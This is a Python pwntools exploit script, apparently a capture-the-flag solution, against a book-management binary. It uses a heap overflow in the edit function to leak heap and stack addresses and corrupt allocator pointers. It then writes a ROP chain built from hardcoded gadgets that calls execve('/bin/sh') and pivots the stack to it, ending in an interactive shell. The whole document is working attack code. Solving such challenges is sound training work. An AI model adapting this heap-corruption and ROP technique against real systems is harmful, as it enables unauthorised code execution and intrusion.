from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './challenge/chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

sla = lambda delim, data: io.sendlineafter(delim, data)
sa = lambda delim, data: io.sendafter(delim, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
r = lambda num=4096: io.recv(num)
def u64d(data): return u64(data.ljust(8, b'\x00'))
def printx(**kwargs):
    for k, v in kwargs.items():
        success("%s: %#x" % (k, v))

io = start()

def create(title, author):
    sla(b'option: ', b'1')
    sla(b'title: ', title)
    sla(b'author: ', author)

def view():
    sla(b'option: ', b'2')
    ru(b'shelf:\n')

def edit(idx, title, author):
    sla(b'option: ', b'3')
    sla(b'edit: ', idx)
    sla(b'title: ', title)
    sla(b'author: ', author)

def delete(idx):
    sla(b'option: ', b'4')
    sla(b'delete: ', idx)

# Create 2 chunks, delete the 2nd. Overflow from the first chunk and then leak. It will read until a null byte.
create(b'AA', b'BB')
create(b'CC', b'DD')
delete(b'1')
edit(b'0', b'', b'E'*64)

view()
ru(b'E'*64)
leak = u64d(rl()[:-1])
printx(heap=leak)

# Fix chunk header and overwrite next pointer of freed chunk and prev pointer of the chunk after
edit(b'0', b'', b'E'*8 + p64(0)*6 + p64(0x98061) + p64(0x47e540-0x10) + p64(0)*10 + p64(0xf8061) + p64(leak+0x60) + p64(0x47e540-0x10)) 
create(b'AA', b'BB')
create(p64(0)+p64(0x464048)+p64(0x464048), b'') # Allocate chunk at BookPtrs and put pointers to leak stack
# 0x0000000000464048 <TC_$SI_PRC_$$_SYSINITENTRYINFORMATION+0x48>  ->  0x00007ffce15f3598  ->  0x00007ffce15f4114  ->  0x622f3d4c4c454853 'SHELL=/bin/bash'

view()
ru(b'"')
stack = u64d(rl()[:-6])
printx(stack=stack)

# Write RIP address of edit function inside the chunk
edit(b'2', p64(0)+p64(stack-0x50), b'')

pop_rdi = 0x404165 # pop rdi; pop r14; pop r13; pop r12; pop rbx; ret;
pop_rsi = 0x40307c # pop rsi; pop r13; pop r12; pop rbx; ret;
pop_rdx = 0x4107dd # pop rdx; add al, byte ptr [rax]; add byte ptr [rbp + 0x31], cl; fisttp dword ptr [rcx - 0x39]; ret 0;
pop_rax = 0x413ef3 # pop rax; ret;
pop_rsp = 0x402f9c # pop rsp; pop rbx; ret;
pop_rcx = 0x438d93 # pop rcx; ret;
syscall = 0x402277 # syscall; ret;

payload = flat(
    b'/bin/sh\x00',  # Dummy value for pop rbx in pop_rsp gadget and this is also used for the execve syscall
    pop_rdi,
    leak-0x80b8, # Pointer to /bin/sh string
    0,0,0,0,
    pop_rsi,
    0,0,0,0,
    pop_rax,
    0x47db70, # Random address in rax for the pop rdx gadget
    pop_rcx,
    leak+0x100, # Writable address for the pop rdx gadget (fisttp instruction)
    pop_rdx,
    0,
    pop_rax,
    0x3b,
    syscall
)

# Put payload on heap. We don't have space to write rop chain directly.
create(payload, b'')

# Stack pivot to ROP chain
payload = flat(
    pop_rsp,
    leak-0x80b8, # Pointer to start of ROP chain
    0,
)
assert len(payload) <= 0x60
edit(b'0', payload, b'') # Write ROP chain to RIP and trigger it

io.interactive()
